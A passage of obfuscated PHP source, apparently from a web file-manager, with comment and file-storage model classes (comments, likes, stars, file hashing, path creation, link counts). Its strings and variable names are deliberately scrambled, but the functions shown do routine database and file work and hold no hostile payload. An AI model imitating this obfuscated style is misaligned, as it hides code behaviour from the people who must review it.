(!in_array($Âûå, $¤ã§…Ë)) { $ü—ßÈ«·ıŒ[] = $Âûå; } } $ü—ßÈ«·ıŒ[] = $ÈÔ¹¦÷ô; } $ÈÔ¹¦÷ô = implode($ö–Ğüİ·±ÉÌÚ[47], $ü—ßÈ«·ıŒ); } public function sort($ „, $ŞÇ) { return parent::update($ „, $ŞÇ); } } goto EõÏ¯ëË; eÉï¿ƒÇµ: class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\155\145\156\164"; protected $tableMeta = array("\x74\x61\x62\154\145\x4e\x61\x6d\x65" => "\143\x6f\155\155\x65\156\x74\137\x6d\145\x74\x61", "\x6d\x65\164\x61\106\151\x65\x6c\x64" => "\x63\157\x6d\155\145\x6e\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Æƒƒ) { $¡„×•í‰ó =& $_SERVER[èÍ×öˆøÉ]; if ($Æƒƒ[$¡„×•í‰ó[1777]]) { $¡£æ = $this->where(array($¡„×•í‰ó[1778] => $Æƒƒ[$¡„×•í‰ó[1777]]))->find(); if (!$¡£æ || $¡£æ[$¡„×•í‰ó[406]] != $Æƒƒ[$¡„×•í‰ó[406]] || $¡£æ[$¡„×•í‰ó[498]] != $Æƒƒ[$¡„×•í‰ó[498]]) { return !1; } $this->where(array($¡„×•í‰ó[1778] => $Æƒƒ[$¡„×•í‰ó[1777]]))->setAdd($¡„×•í‰ó[1779], 1); } $Æƒƒ[$¡„×•í‰ó[1780]] = 0; $Æƒƒ[$¡„×•í‰ó[1779]] = 0; $Æƒƒ[$¡„×•í‰ó[745]] = 1; return $this->add($Æƒƒ); } public function commentCount($‚ÆÊÑ¨ä×íØ, $ó¥õòş„, $®”äƒ£”©‘‰ = false) { $¹Û¬Âò =& $_SERVER[èÍ×öˆøÉ]; if (!$‚ÆÊÑ¨ä×íØ) { return array(); } if (is_string($‚ÆÊÑ¨ä×íØ) || is_int($‚ÆÊÑ¨ä×íØ)) { $‚ÆÊÑ¨ä×íØ = array($‚ÆÊÑ¨ä×íØ); } $ƒùñ = array($¹Û¬Âò[498], $¹Û¬Âò[1781] => $¹Û¬Âò[494]); $²Äù = array($¹Û¬Âò[498] => array($¹Û¬Âò[7], $‚ÆÊÑ¨ä×íØ), $¹Û¬Âò[406] => $ó¥õòş„); if ($®”äƒ£”©‘‰) { $²Äù[$¹Û¬Âò[1582]] = $®”äƒ£”©‘‰; } $ìÌ”¾ƒ = $this->field($ƒùñ)->where($²Äù)->group($¹Û¬Âò[498])->select(); return array_to_keyvalue($ìÌ”¾ƒ, $¹Û¬Âò[498], $¹Û¬Âò[494]); } public function starTarget($À§„ä, $£ åÑ”æœ‡) { $ì¤Ùš³ =& $_SERVER[èÍ×öˆøÉ]; $şåÅŞ = $À§„ä + self::TYPE_STAR_OFFSET; $‰ûŞª“šÍª = array($ì¤Ùš³[1582] => USER_ID, $ì¤Ùš³[406] => $şåÅŞ, $ì¤Ùš³[498] => $£ åÑ”æœ‡); $Ù«ôÑ = $this->where($‰ûŞª“šÍª)->find(); if ($Ù«ôÑ) { return $this->where(array($ì¤Ùš³[395] => $Ù«ôÑ[$ì¤Ùš³[395]]))->delete(); } $²ª¦¿ = array($ì¤Ùš³[1777] => 0, $ì¤Ùš³[1582] => USER_ID, $ì¤Ùš³[745] => 1, $ì¤Ùš³[750] => $ì¤Ùš³[33], $ì¤Ùš³[406] => $şåÅŞ, $ì¤Ùš³[498] => $£ åÑ”æœ‡, $ì¤Ùš³[1780] => 0, $ì¤Ùš³[1779] => 0); return $this->add($²ª¦¿); } public function starTargetCount($Ü¥²Ïı›ƒ, $‘¥š€Ê¸¬) { $æ‡á¢Û =& $_SERVER[èÍ×öˆøÉ]; $Ú‘Ãİ»Å÷  = $‘¥š€Ê¸¬ + self::TYPE_STAR_OFFSET; $‹¤éõ˜ = $this->commentCount($Ü¥²Ïı›ƒ, $Ú‘Ãİ»Å÷ ); $Ô½Æ¾©ı“ = $this->commentCount($Ü¥²Ïı›ƒ, $Ú‘Ãİ»Å÷ , USER_ID); return array($æ‡á¢Û[1782] => $‹¤éõ˜, $æ‡á¢Û[1783] => $Ô½Æ¾©ı“); } public function starTargetUserList($©ì×…úç, $€¼™) { $öØÑùòğ =& $_SERVER[èÍ×öˆøÉ]; $‡’ÎÕ©¥ = $©ì×…úç + self::TYPE_STAR_OFFSET; $—‘„ãåØ = array($öØÑùòğ[498] => $€¼™, $öØÑùòğ[406] => $‡’ÎÕ©¥); $¸ÆÃ‹‘Ö‘ = $this->where($—‘„ãåØ)->count(); $¡€ = array($öØÑùòğ[253] => $¸ÆÃ‹‘Ö‘, $öØÑùòğ[1784] => array()); if (!$¸ÆÃ‹‘Ö‘) { return $¡€; } $•Ó¡ãèÖüÉ = $this->field($öØÑùòğ[1582])->where($—‘„ãåØ)->limit(500)->select(); $•Ó¡ãèÖüÉ = array_to_keyvalue($•Ó¡ãèÖüÉ, $öØÑùòğ[33], $öØÑùòğ[1582]); $¡€[$öØÑùòğ[1784]] = Model($öØÑùòğ[507])->userListInfo($•Ó¡ãèÖüÉ); return $¡€; } public function prasiseUserList($—ÛÙ–Úó) { $é¹ÍÛ•“øã =& $_SERVER[èÍ×öˆøÉ]; $É‹öŒÑ®® = array($é¹ÍÛ•“øã[1785] => $—ÛÙ–Úó); $ñãÕ¼¯²Ö = $this->where($É‹öŒÑ®®)->find(); $şââİ = _get($ñãÕ¼¯²Ö, $é¹ÍÛ•“øã[1780], 0); $íÙ¯ı÷ = array($é¹ÍÛ•“øã[253] => $şââİ, $é¹ÍÛ•“øã[1784] => array()); if (!$şââİ) { return $íÙ¯ı÷; } $¤ôÓçì—¨ = Model($é¹ÍÛ•“øã[1786])->field($é¹ÍÛ•“øã[1582])->where($É‹öŒÑ®®)->limit(500)->select(); $¤ôÓçì—¨ = array_to_keyvalue($¤ôÓçì—¨, $é¹ÍÛ•“øã[33], $é¹ÍÛ•“øã[1582]); $íÙ¯ı÷[$é¹ÍÛ•“øã[1784]] = Model($é¹ÍÛ•“øã[507])->userListInfo($¤ôÓçì—¨); return $íÙ¯ı÷; } public function remove($®Â²Ê ) { $ĞÍî =& $_SERVER[èÍ×öˆøÉ]; $å‰Ê«ÓÜ… = array($ĞÍî[1778] => $®Â²Ê ); $ûä‘›–ûø = $this->where($å‰Ê«ÓÜ…)->find(); if ($ûä‘›–ûø[$ĞÍî[1777]]) { $this->where(array($ĞÍî[1778] => $ûä‘›–ûø[$ĞÍî[1777]]))->setAdd($ĞÍî[1779], -1); } return $this->where($å‰Ê«ÓÜ…)->delete(); } public function edit($˜ú, $‹™ƒ·¨) { $Æß´øÊõõáÎë =& $_SERVER[èÍ×öˆøÉ]; $Ë¾¾‡ = array($Æß´øÊõõáÎë[1778] => $˜ú); return $this->where($Ë¾¾‡)->save(array($Æß´øÊõõáÎë[1787] => $‹™ƒ·¨)); } public function prasise($âãäÜ) { $³Â =& $_SERVER[èÍ×öˆøÉ]; $óí› = Model($³Â[1788]); $ïÉÒªã = array($³Â[1778] => $âãäÜ, $³Â[1573] => USER_ID); $İï™±ù = $óí›->where($ïÉÒªã)->find(); if (!$İï™±ù) { $óí›->add($ïÉÒªã); $º¨ = $this->where(array($³Â[1778] => $âãäÜ))->setAdd($³Â[1780], 1); } else { $óí›->where($ïÉÒªã)->delete(); $º¨ = $this->where(array($³Â[1778] => $âãäÜ))->setAdd($³Â[1780], -1); } return $º¨; } public function targetInfo($£´û·ÌØ, $Õë) { $ışŒ³ı‡âï  =& $_SERVER[èÍ×öˆøÉ]; $èÅ = array($ışŒ³ı‡âï [574] => $£´û·ÌØ, $ışŒ³ı‡âï [575] => $Õë); $Šî = $this->where($èÅ)->count(); $¯ŞÙ = "\x52\x49\x47\x48\x54\x20\112\117\x49\116\x20{$this->tablePrefix}\143\x6f\x6d\x6d\x65\156\x74\x5f\160\162\141\x69\x73\x65\40\163\164\x61\x72\x20\x6f\156\x20\x63\157\x6d\x6d\x65\156\x74\x2e\143\157\155\155\x65\156\164\111\104\x20\75\40\x73\164\x61\162\x2e\143\157\155\155\145\x6e\x74\x49\104"; $ışï©“é¢Ö› = $this->alias($ışŒ³ı‡âï [352])->where($èÅ)->join($¯ŞÙ, $ışŒ³ı‡âï [1789])->count(); $´¦  = array($ışŒ³ı‡âï [1790] => $Šî, $ışŒ³ı‡âï [1791] => $ışï©“é¢Ö›); return $´¦ ; } public function listData($‡¨äÙ¹®Õ¾‡) { $´€Ô¢ ¤Çû— =& $_SERVER[èÍ×öˆøÉ]; if (isset($‡¨äÙ¹®Õ¾‡[$´€Ô¢ ¤Çû—[1792]])) { if ($‡¨äÙ¹®Õ¾‡[$´€Ô¢ ¤Çû—[1792]]) { $‡¨äÙ¹®Õ¾‡[$´€Ô¢ ¤Çû—[1785]] = array($´€Ô¢ ¤Çû—[1011], intval($‡¨äÙ¹®Õ¾‡[$´€Ô¢ ¤Çû—[1792]])); } unset($‡¨äÙ¹®Õ¾‡[$´€Ô¢ ¤Çû—[1792]]); } if (isset($‡¨äÙ¹®Õ¾‡[$´€Ô¢ ¤Çû—[1793]])) { if ($‡¨äÙ¹®Õ¾‡[$´€Ô¢ ¤Çû—[1793]]) { $‡¨äÙ¹®Õ¾‡[$´€Ô¢ ¤Çû—[1785]] = array($´€Ô¢ ¤Çû—[1008], intval($‡¨äÙ¹®Õ¾‡[$´€Ô¢ ¤Çû—[1793]])); } unset($‡¨äÙ¹®Õ¾‡[$´€Ô¢ ¤Çû—[1793]]); } return $this->_listData($‡¨äÙ¹®Õ¾‡); } private function _listData($·±À¾) { $ø™éÄı«ï =& $_SERVER[èÍ×öˆøÉ]; $—õ¾Ÿ— = $this->where($·±À¾)->_makeOrder()->selectPage(100); $this->_listAppendParent($—õ¾Ÿ—[$ø™éÄı«ï[367]]); $this->_listAppendUser($—õ¾Ÿ—[$ø™éÄı«ï[367]]); $this->_listAppendMeta($—õ¾Ÿ—[$ø™éÄı«ï[367]]); return $—õ¾Ÿ—; } private function _makeOrder() { $ĞÈˆ‹ëéù˜öÑ =& $_SERVER[èÍ×öˆøÉ]; $Š”Ô–Êˆ› = array($ĞÈˆ‹ëéù˜öÑ[1780], $ĞÈˆ‹ëéù˜öÑ[1779], $ĞÈˆ‹ëéù˜öÑ[194]); $Âß = Input::get($ĞÈˆ‹ëéù˜öÑ[449], $ĞÈˆ‹ëéù˜öÑ[7], $ĞÈˆ‹ëéù˜öÑ[418], $Š”Ô–Êˆ›); $ğÜäÏ = Input::get($ĞÈˆ‹ëéù˜öÑ[450], $ĞÈˆ‹ëéù˜öÑ[7], $ĞÈˆ‹ëéù˜öÑ[1575], array($ĞÈˆ‹ëéù˜öÑ[1794], $ĞÈˆ‹ëéù˜öÑ[445])); $š±×¹ = $Âß . $ĞÈˆ‹ëéù˜öÑ[50] . $ğÜäÏ; return $this->order($š±×¹); } private function _listAppendParent(&$ñĞ¯÷) { $˜®Š¬æâÚ©€ =& $_SERVER[èÍ×öˆøÉ]; $øÓØş¤Ÿìı = array_unique(array_to_keyvalue($ñĞ¯÷, $˜®Š¬æâÚ©€[33], $˜®Š¬æâÚ©€[1777])); $øÓØş¤Ÿìı = array_remove_value($øÓØş¤Ÿìı, $˜®Š¬æâÚ©€[191]); if (!$øÓØş¤Ÿìı) { return; } $ë«€ùÔ¦¨¢ = $this->where(array($˜®Š¬æâÚ©€[1778] => array($˜®Š¬æâÚ©€[7], $øÓØş¤Ÿìı)))->select(); $ë«€ùÔ¦¨¢ = array_to_keyvalue($ë«€ùÔ¦¨¢, $˜®Š¬æâÚ©€[1785]); foreach ($ñĞ¯÷ as &$®) { if (isset($ë«€ùÔ¦¨¢[$®[$˜®Š¬æâÚ©€[1777]]])) { $®[$˜®Š¬æâÚ©€[1795]] = $ë«€ùÔ¦¨¢[$®[$˜®Š¬æâÚ©€[1777]]]; } } unset($®); } private function _listAppendUser(&$³ş•„™Ë¼ã•) { $·İøÍÜˆ¨» =& $_SERVER[èÍ×öˆøÉ]; $ØŸ¡Úœé“Îê¹ = array_unique(array_to_keyvalue($³ş•„™Ë¼ã•, $·İøÍÜˆ¨»[33], $·İøÍÜˆ¨»[1582])); $ØŸ¡Úœé“Îê¹ = array_remove_value($ØŸ¡Úœé“Îê¹, $·İøÍÜˆ¨»[191]); if (count($ØŸ¡Úœé“Îê¹) == 0) { return; } foreach ($³ş•„™Ë¼ã• as $«¨êÃÓõöğ) { if (isset($«¨êÃÓõöğ[$·İøÍÜˆ¨»[1795]])) { $ØŸ¡Úœé“Îê¹[] = $«¨êÃÓõöğ[$·İøÍÜˆ¨»[1795]][$·İøÍÜˆ¨»[1582]]; } } $“Ûæ®¦…ß·ŒÁ = Model($·İøÍÜˆ¨»[532])->userListInfo($ØŸ¡Úœé“Îê¹); foreach ($³ş•„™Ë¼ã• as &$«¨êÃÓõöğ) { $«¨êÃÓõöğ[$·İøÍÜˆ¨»[588]] = $“Ûæ®¦…ß·ŒÁ[$«¨êÃÓõöğ[$·İøÍÜˆ¨»[1582]]]; if (isset($«¨êÃÓõöğ[$·İøÍÜˆ¨»[1795]])) { $«¨êÃÓõöğ[$·İøÍÜˆ¨»[1795]][$·İøÍÜˆ¨»[588]] = $“Ûæ®¦…ß·ŒÁ[$«¨êÃÓõöğ[$·İøÍÜˆ¨»[1795]][$·İøÍÜˆ¨»[1582]]]; } } unset($«¨êÃÓõöğ); } private function _listAppendMeta(&$Èù¹ÆÉû›Ñ¹ë) { $ÛĞè´ˆö¯ö¯ =& $_SERVER[èÍ×öˆøÉ]; $‘… = array_unique(array_to_keyvalue($Èù¹ÆÉû›Ñ¹ë, $ÛĞè´ˆö¯ö¯[33], $ÛĞè´ˆö¯ö¯[1785])); $‘… = array_remove_value($‘…, $ÛĞè´ˆö¯ö¯[191]); if (!$‘…) { return; } foreach ($Èù¹ÆÉû›Ñ¹ë as $ß¡ÄŞà§) { if (isset($ß¡ÄŞà§[$ÛĞè´ˆö¯ö¯[1795]])) { $‘…[] = $ß¡ÄŞà§[$ÛĞè´ˆö¯ö¯[1795]][$ÛĞè´ˆö¯ö¯[1785]]; } } $…€ô“ = $this->metaList($‘…); if (!$…€ô“) { return !1; } foreach ($Èù¹ÆÉû›Ñ¹ë as &$ß¡ÄŞà§) { $ß¡ÄŞà§[$ÛĞè´ˆö¯ö¯[459]] = $…€ô“[$ß¡ÄŞà§[$ÛĞè´ˆö¯ö¯[1785]]]; if (isset($ß¡ÄŞà§[$ÛĞè´ˆö¯ö¯[1795]])) { $ß¡ÄŞà§[$ÛĞè´ˆö¯ö¯[1795]][$ÛĞè´ˆö¯ö¯[459]] = $…€ô“[$ß¡ÄŞà§[$ÛĞè´ˆö¯ö¯[1795]][$ÛĞè´ˆö¯ö¯[1785]]]; } } unset($ß¡ÄŞà§); } private function metaList($üÁ„) { $‰ÂÙª =& $_SERVER[èÍ×öˆøÉ]; if (!$üÁ„) { return array(); } $ÈçæÉ‰½›áˆ« = array($‰ÂÙª[1785] => array($‰ÂÙª[7], $üÁ„)); $ØÜ—©à = Model($‰ÂÙª[1796])->where($ÈçæÉ‰½›áˆ«)->select(); $ØÜ—©à = array_to_keyvalue_group($ØÜ—©à, $‰ÂÙª[1785]); foreach ($ØÜ—©à as $Ñ˜ÓÕñ½Ú => $Ïƒò‹¹‰·‡) { $ÒÆİÃ¾é = array(); foreach ($Ïƒò‹¹‰·‡ as $›ßàáèğ„ÆÑ) { $ÒÆİÃ¾é[$›ßàáèğ„ÆÑ[$‰ÂÙª[93]]] = $›ßàáèğ„ÆÑ[$‰ÂÙª[372]]; } $ØÜ—©à[$Ñ˜ÓÕñ½Ú] = $ÒÆİÃ¾é; } return $ØÜ—©à ? $ØÜ—©à : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\137\146\x69\x6c\x65\x5f\x63\157\156\164\145\x6e\164\x73"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\x65\124\151\155\145", "\164\151\x6d\145", "\x69\156\163\x65\x72\164", "\x66\x75\x6e\143\x74\x69\157\156")); } class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\x66\151\x6c\145"; protected $tableMeta = array("\164\141\142\154\x65\116\x61\x6d\145" => "\151\157\x5f\146\151\x6c\145\x5f\155\x65\164\x61", "\x6d\x65\164\141\x46\151\145\154\144" => "\x66\x69\x6c\145\111\104"); public function fileInfo($ñŒ¡Øˆ) { $´À¸ŞÜŠ =& $_SERVER[èÍ×öˆøÉ]; static $ËÕÜ×•· = array(); if (!isset($ËÕÜ×•·[$ñŒ¡Øˆ])) { $‡Æşâ‡×ˆåà = $´À¸ŞÜŠ[1797]; $Úí = Model($´À¸ŞÜŠ[464])->field($‡Æşâ‡×ˆåà)->where(array($´À¸ŞÜŠ[462] => $ñŒ¡Øˆ))->find(); $ËÕÜ×•·[$ñŒ¡Øˆ] = $Úí; } return $ËÕÜ×•·[$ñŒ¡Øˆ]; } public function addFileByContent($˜Ú™ß‘ = '', $†â«  = '') { $¦ˆï =& $_SERVER[èÍ×öˆøÉ]; $´ÊáåÂë•Œ = TEMP_PATH . $¦ˆï[1798]; if (!is_dir($´ÊáåÂë•Œ)) { mk_dir($´ÊáåÂë•Œ); } $ßÎß—Û‘Í¯Ç“ = $´ÊáåÂë•Œ . $¦ˆï[1799] . rand_string(16); file_put_contents($ßÎß—Û‘Í¯Ç“, $˜Ú™ß‘); $áÁ•¦äÜñ™Æ = $this->addFile($ßÎß—Û‘Í¯Ç“, $†â« , !0); if (file_exists($ßÎß—Û‘Í¯Ç“)) { @unlink($ßÎß—Û‘Í¯Ç“); } return $áÁ•¦äÜñ™Æ; } public function createFileName($ù«¡Ğê¼, $”ô¤¼‡ = false, $¦ï = false) { $ë =& $_SERVER[èÍ×öˆøÉ]; $„Ãì = IO::init($ë[8]); $—ãÁÖ³üêÂ = $this->makeFilePath($ù«¡Ğê¼, $„Ãì, $”ô¤¼‡, $¦ï); $¬ò²şøĞÈ¥Ô = $„Ãì->pathFather($—ãÁÖ³üêÂ); static $¾¨»ùßó²Ã = false; $Í±ì = $ë[1800] . md5($¬ò²şøĞÈ¥Ô); if (!$¾¨»ùßó²Ã && !Cache::get($Í±ì)) { $¾¨»ùßó²Ã = !0; $Ê¯ = IO::mkdir($¬ò²şøĞÈ¥Ô); if (!IO::exist($Ê¯ . $ë[798])) { IO::mkfile($Ê¯ . $ë[798]); } Cache::set($Í±ì, 1, 3600 * 2); } return $—ãÁÖ³üêÂ; } public function makeFilePath($½“ÁêÆ, $Ô—®¼‰èÙúÉ, $Şş¨Û© = false, $‡ÏÛ°–²ÃÅ = false) { $–üß«µÙ«ïº =& $_SERVER[èÍ×öˆøÉ]; $äÛÇÅÏÃ = Model($–üß«µÙ«ïº[765])->get($–üß«µÙ«ïº[1801]); $Çî¾ = KodIO::defaultIO() . date($–üß«µÙ«ïº[1802]); $è¢ÊÏ†Ù¯Ôá = $Çî¾ . rand_string(5) . short_id(100); $½“ÁêÆ = str_replace($–üß«µÙ«ïº[8], $–üß«µÙ«ïº[71], KodIO::clear($½“ÁêÆ)); $şŒı• = $Ô—®¼‰èÙúÉ->ext($½“ÁêÆ); if (!$½“ÁêÆ) { $äÛÇÅÏÃ = $–üß«µÙ«ïº[1803]; } switch ($äÛÇÅÏÃ) { case $–üß«µÙ«ïº[1804]: $è¢ÊÏ†Ù¯Ôá = $è¢ÊÏ†Ù¯Ôá . $–üß«µÙ«ïº[95] . $Ô—®¼‰èÙúÉ->ext($½“ÁêÆ); if ($şŒı• == $–üß«µÙ«ïº[1741]) { $è¢ÊÏ†Ù¯Ôá .= $–üß«µÙ«ïº[1481]; } break; case $–üß«µÙ«ïº[1805]: $÷¯‘  = Model($–üß«µÙ«ïº[765])->get($–üß«µÙ«ïº[766]); $«ÙşõÙİ³·¦ = substr(md5($–üß«µÙ«ïº[767] . $÷¯‘  . date($–üß«µÙ«ïº[743])), 0, 8); $ü¹üĞÒô = KodIO::defaultDriver(); $Çî¾ = $–üß«µÙ«ïº[1162] . $ü¹üĞÒô[$–üß«µÙ«ïº[395]] . $–üß«µÙ«ïº[404] . date($–üß«µÙ«ïº[1806]) . $«ÙşõÙİ³·¦ . $–üß«µÙ«ïº[8]; if ($şŒı• == $–üß«µÙ«ïº[1741]) { $½“ÁêÆ .= $–üß«µÙ«ïº[1481]; } $ß–©›şøÂ³ = $–üß«µÙ«ïº[1807] . $Çî¾ . $½“ÁêÆ; CacheLock::lock($ß–©›şøÂ³); $è¢ÊÏ†Ù¯Ôá = $Çî¾ . $½“ÁêÆ; if (IO::exist($Çî¾ . $½“ÁêÆ)) { $€… = substr($½“ÁêÆ, 0, strlen($½“ÁêÆ) - strlen($şŒı•)); $éÉ = $‡ÏÛ°–²ÃÅ ? substr($‡ÏÛ°–²ÃÅ, 0, 5) : ($Şş¨Û© ? substr($Şş¨Û©, 0, 5) : rand_string(5)); $è¢ÊÏ†Ù¯Ôá = $Çî¾ . $€… . $éÉ . $–üß«µÙ«ïº[95] . $şŒı•; } if (IO::isTypeObject($è¢ÊÏ†Ù¯Ôá) && !IO::isUploadServer($è¢ÊÏ†Ù¯Ôá)) { if (IO::exist($è¢ÊÏ†Ù¯Ôá)) { return $è¢ÊÏ†Ù¯Ôá; } $¦è = IO::setContent($è¢ÊÏ†Ù¯Ôá, $–üß«µÙ«ïº[33]); if (!$¦è) { show_json($–üß«µÙ«ïº[1808], !1); } } CacheLock::unlock($ß–©›şøÂ³); break; case $–üß«µÙ«ïº[1803]: break; default: break; } return $è¢ÊÏ†Ù¯Ôá; } public function addFileByRemote($îØ‡»ÄÑĞ°Ô, $¶ÜĞ, $„Á²ª™µ»¡ = array()) { $ë¯‡Â =& $_SERVER[èÍ×öˆøÉ]; if (!IO::exist($îØ‡»ÄÑĞ°Ô)) { return !1; } $ºá¿ = $„Á²ª™µ»¡[$ë¯‡Â[170]] ? $„Á²ª™µ»¡[$ë¯‡Â[170]] : $ë¯‡Â[33]; $¦Çå¡îı = IO::hashMd5($îØ‡»ÄÑĞ°Ô, $ºá¿); $áãÇÅÀ–‚ = KodIO::defaultDriver(); $Ïä½à = array($ë¯‡Â[573] => IO::size($îØ‡»ÄÑĞ°Ô), $ë¯‡Â[1809] => 1, $ë¯‡Â[415] => $¶ÜĞ, $ë¯‡Â[810] => $áãÇÅÀ–‚[$ë¯‡Â[395]], $ë¯‡Â[416] => $îØ‡»ÄÑĞ°Ô, $ë¯‡Â[1810] => $„Á²ª™µ»¡[$ë¯‡Â[171]] ? $„Á²ª™µ»¡[$ë¯‡Â[171]] : IO::hashSimple($îØ‡»ÄÑĞ°Ô), $ë¯‡Â[1811] => $¦Çå¡îı ? $¦Çå¡îı : $ºá¿); if ($Á–ïÚ×û = $this->addFileCheckExist($Ïä½à[$ë¯‡Â[171]], $Ïä½à[$ë¯‡Â[170]], $Ïä½à[$ë¯‡Â[78]])) { return $Á–ïÚ×û; } return $this->addFileData($Ïä½à); } private function addFileData($ı¾Öê‹»íÔâ) { $çñâéî =& $_SERVER[èÍ×öˆøÉ]; if (!$ı¾Öê‹»íÔâ) { return !1; } $ı¾Öê‹»íÔâ[$çñâéî[78]] = intval($ı¾Öê‹»íÔâ[$çñâéî[78]]); if (!$ı¾Öê‹»íÔâ[$çñâéî[78]] && strlen($ı¾Öê‹»íÔâ[$çñâéî[171]]) > 32) { $ı¾Öê‹»íÔâ[$çñâéî[78]] = intval(substr($ı¾Öê‹»íÔâ[$çñâéî[171]], 32)); } $å‡öÕéÃ = $this->add($ı¾Öê‹»íÔâ); return $this->find($å‡öÕéÃ); } public function addFile($–Âé†äÀĞ, $¥ş, $ß¤­áßÍâ˜ = false) { $ÂÊŠ¥˜ =& $_SERVER[èÍ×öˆøÉ]; $õ–Š‹‰Ş˜ = IO::hashSimple($–Âé†äÀĞ); $§”é´È¦À = IO::size($–Âé†äÀĞ); $ªÔÙ•ê» = $§”é´È¦À <= 1024 * 1024 * 10 ? IO::hashMd5($–Âé†äÀĞ) : $ÂÊŠ¥˜[33]; $ã—ÔüœÙÚ€ì¶ = $ÂÊŠ¥˜[1812] . $õ–Š‹‰Ş˜; CacheLock::lock($ã—ÔüœÙÚ€ì¶); if ($ªÔÙ•ê» && $õ–Š‹‰Ş˜) { $½Á¦ = $this->addFileCheckExist($õ–Š‹‰Ş˜, $ªÔÙ•ê», $§”é´È¦À); if ($½Á¦) { CacheLock::unlock($ã—ÔüœÙÚ€ì¶); return $½Á¦; } } $éË¤»£¡æ´ = $this->addFileMake($–Âé†äÀĞ, $§”é´È¦À, $õ–Š‹‰Ş˜, $ªÔÙ•ê», $¥ş, $ß¤­áßÍâ˜); $ññ” = $this->addFileData($éË¤»£¡æ´); CacheLock::unlock($ã—ÔüœÙÚ€ì¶); if (!$ªÔÙ•ê» && $ññ”) { $this->fileMd5Check($ññ”); } return $ññ”; } private function fileMd5Check($éâåèÌô”‹) { $«—¦©Áâ =& $_SERVER[èÍ×öˆøÉ]; $û¡¢ˆô·¨à = array($éâåèÌô”‹[$«—¦©Áâ[461]], $éâåèÌô”‹[$«—¦©Áâ[76]]); $áÍ = $«—¦©Áâ[1813] . $éâåèÌô”‹[$«—¦©Áâ[76]]; $â—ûé’«‹–„ = $«—¦©Áâ[1814] . $éâåèÌô”‹[$«—¦©Áâ[461]]; $Û²‘ßí„ù…Å = TaskQueue::add($«—¦©Áâ[1815], $û¡¢ˆô·¨à, $áÍ, $â—ûé’«‹–„); if (!$Û²‘ßí„ù…Å) { $this->fileMd5Set($éâåèÌô”‹[$«—¦©Áâ[461]], $éâåèÌô”‹[$«—¦©Áâ[76]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($áÙÌÖûŒÅ, $Ø›ÜÜµ) { $ôàµö£Ç¼”“» =& $_SERVER[èÍ×öˆøÉ]; $È’İŞÆ· = $this->find($áÙÌÖûŒÅ); if (!$È’İŞÆ· || $È’İŞÆ·[$ôàµö£Ç¼”“»[170]]) { return; } $Û÷Ş–èõß = IO::hashMd5($Ø›ÜÜµ); if (!$Û÷Ş–èõß) { return $ôàµö£Ç¼”“»[33]; } $this->where(array($ôàµö£Ç¼”“»[461] => $áÙÌÖûŒÅ))->save(array($ôàµö£Ç¼”“»[170] => $Û÷Ş–èõß)); } public function addFileMake($Š”ÎˆÎ¤Å, $¨‰ôåñßÄ¤, $©¡, $ïÒ, $¦à½ó©£, $•Êü¸) { $ĞÜ¿ê =& $_SERVER[èÍ×öˆøÉ]; $©¸¸¿ÖĞú¬± = $this->createFileName($¦à½ó©£, $©¡, $ïÒ); $ºÇƒŒ = get_path_father($©¸¸¿ÖĞú¬±); $ˆÅĞöëù“ƒÌ = get_path_this($©¸¸¿ÖĞú¬±); if ($•Êü¸) { $› = IO::move($Š”ÎˆÎ¤Å, $ºÇƒŒ, !1, $ˆÅĞöëù“ƒÌ); } else { $› = IO::copy($Š”ÎˆÎ¤Å, $ºÇƒŒ, !1, $ˆÅĞöëù“ƒÌ); } if (!$›) { return !1; } $„µ§ß¢¼ö¸Âù = KodIO::defaultDriver(); $Úó°˜„› = array($ĞÜ¿ê[573] => $¨‰ôåñßÄ¤, $ĞÜ¿ê[1809] => 1, $ĞÜ¿ê[415] => $¦à½ó©£, $ĞÜ¿ê[810] => $„µ§ß¢¼ö¸Âù[$ĞÜ¿ê[395]], $ĞÜ¿ê[416] => $©¸¸¿ÖĞú¬±, $ĞÜ¿ê[1810] => $©¡, $ĞÜ¿ê[1811] => $ïÒ); return $Úó°˜„›; } public function addFileCheckExist($ïŠ‡¾¦Ó, $Ş§â¦ìÍú, $ö·–«…Ğüàº¿) { $Â‡®ÚÈ =& $_SERVER[èÍ×öˆøÉ]; $¹ÚÖ = $this->findByHash($ïŠ‡¾¦Ó, $Ş§â¦ìÍú); if (!$¹ÚÖ) { return !1; } $˜µ¼ª = array($Â‡®ÚÈ[1809] => intval($¹ÚÖ[$Â‡®ÚÈ[1816]]) + 1, $Â‡®ÚÈ[573] => $ö·–«…Ğüàº¿); $this->where(array($Â‡®ÚÈ[462] => $¹ÚÖ[$Â‡®ÚÈ[461]]))->save($˜µ¼ª); return $¹ÚÖ; } public function remove($‘¿) { $this->linkCountChange($‘¿, !1); $this->clearEmpty(); return !0; } public function linkAdd($‰¼©õß) { $this->linkCountChange($‰¼©õß, !0); } public function linkCountChange($Íö­‡å«÷ë—¿, $œÔ) { $ó‰éùøµ =& $_SERVER[èÍ×öˆøÉ]; if (!$Íö­‡å«÷ë—¿) { return; } if (!is_array($Íö­‡å«÷ë—¿)) { $Íö­‡å«÷ë—¿ = array($Íö­‡å«÷ë—¿); } $’çæœÚÏÊ·ÜÍ = array(); foreach ($Íö­‡å«÷ë—¿ as $–Óì) { $Œ’åÏªı§ = $–Óì . $ó‰éùøµ[33]; if (!$’çæœÚÏÊ·ÜÍ[$Œ’åÏªı§]) { $’çæœÚÏÊ·ÜÍ[$Œ’åÏªı§] = 0; } $’çæœÚÏÊ·ÜÍ[$Œ’åÏªı§]++; } $‰£ = array(); foreach ($’çæœÚÏÊ·ÜÍ as $–Óì => $ÁÆ‰†ßÆÖ±) { $Œ’åÏªı§ = $ÁÆ‰†ßÆÖ± . $ó‰éùøµ[33]; if (!$‰£[$Œ’åÏªı§]) { $‰£[$Œ’åÏªı§] = array(); } $‰£[$Œ’åÏªı§][] = $–Óì; } foreach ($‰£ as $ÁÆ‰†ßÆÖ± => $×¬Üº­) { if (!$×¬Üº­) { 